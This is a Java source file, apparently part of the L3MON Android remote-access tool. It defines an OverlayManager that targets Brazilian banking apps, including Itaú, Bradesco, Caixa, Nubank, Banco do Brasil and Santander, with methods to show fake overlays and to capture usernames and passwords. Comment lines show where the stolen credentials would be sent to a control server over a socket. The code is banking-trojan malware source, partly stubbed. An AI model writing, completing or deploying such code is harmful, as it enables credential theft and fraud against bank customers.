package com.etechd.l3mon.managers;

import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

public class OverlayManager {

    private static final Map<String, String> BANK_PACKAGES = new HashMap<>();
    private static final List<String> activeOverlays = new ArrayList<>();
    private static boolean overlayMonitoringEnabled = false;
    private static Timer overlayTimer;

    static {
        BANK_PACKAGES.put("itau", "com.itau");
        BANK_PACKAGES.put("bradesco", "com.bradesco");
        BANK_PACKAGES.put("caixa", "com.caixa");
        BANK_PACKAGES.put("nubank", "com.nubank");
        BANK_PACKAGES.put("bb", "com.bb");
        BANK_PACKAGES.put("santander", "com.santander");
    }

    public void enableOverlayMonitoring() {
        overlayMonitoringEnabled = true;
        startMonitoring();
    }

    public void disableOverlayMonitoring() {
        overlayMonitoringEnabled = false;
        if (overlayTimer != null) {
            overlayTimer.cancel();
            overlayTimer = null;
        }
    }

    private void startMonitoring() {
        if (overlayTimer != null) overlayTimer.cancel();

        overlayTimer = new Timer();
        overlayTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                // Aqui você chamaria o método de monitoramento do serviço
                // Exemplo: monitorForegroundApp();
            }
        }, 0, 2000);
    }

    public void showFakeOverlay(String bankName, String packageName) {
        try {
            JSONObject event = new JSONObject();
            event.put("action", "show_overlay");
            event.put("appName", bankName.toUpperCase());
            event.put("packageName", packageName);
            event.put("success", true);
            event.put("timestamp", System.currentTimeMillis());

            // Enviar para servidor
            // ConnectionManager.ioSocket.emit("0xOI", event);

            activeOverlays.add(bankName.toLowerCase());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void captureCredentials(String bankName, String username, String password) {
        try {
            JSONObject event = new JSONObject();
            event.put("action", "capture_credentials");
            event.put("appName", bankName);
            event.put("username", username);
            event.put("password", password);
            event.put("success", true);
            event.put("timestamp", System.currentTimeMillis());

            // ConnectionManager.ioSocket.emit("0xOI", event);
            activeOverlays.remove(bankName.toLowerCase());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}